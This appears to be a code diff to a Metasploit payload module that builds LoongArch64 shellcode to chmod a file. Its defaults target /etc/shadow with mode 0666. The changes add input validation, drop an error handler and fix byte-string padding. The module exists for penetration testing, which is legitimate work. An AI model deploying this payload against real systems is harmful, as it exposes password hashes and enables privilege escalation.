@@ -29,7 +29,7 @@ module MetasploitModule
     )
     register_options([
       OptString.new('FILE', [ true, 'Filename to chmod', '/etc/shadow' ]),
-      OptString.new('MODE', [ true, 'File mode (octal)', '0666' ]),
+      OptString.new('MODE', [ true, 'File mode (octal)', '0666' ], regex: /\A[0-7]+\z/),
     ])
   end
 
@@ -41,8 +41,6 @@ module MetasploitModule
   # @return [Integer] the desired mode for the file
   def mode
     (datastore['MODE'] || '0666').oct
-  rescue StandardError => e
-    raise ArgumentError, "Invalid chmod mode '#{datastore['MODE']}': #{e.message}"
   end
 
   # @return [Integer] LoongArch64 instruction to load mode into $a2 register
@@ -66,10 +64,10 @@ module MetasploitModule
       0x0381740b,  # ori $a7, $zero, 93       # __NR_exit
       0x002b0101,  # syscall 0x101
     ].pack('V*')
-    shellcode += chmod_file_path + "\x00"
+    shellcode += chmod_file_path + "\x00".b
 
     # align our shellcode to 4 bytes
-    shellcode += "\x00" while shellcode.bytesize % 4 != 0
+    shellcode += "\x00".b while shellcode.bytesize % 4 != 0
 
     super.to_s + shellcode
   end
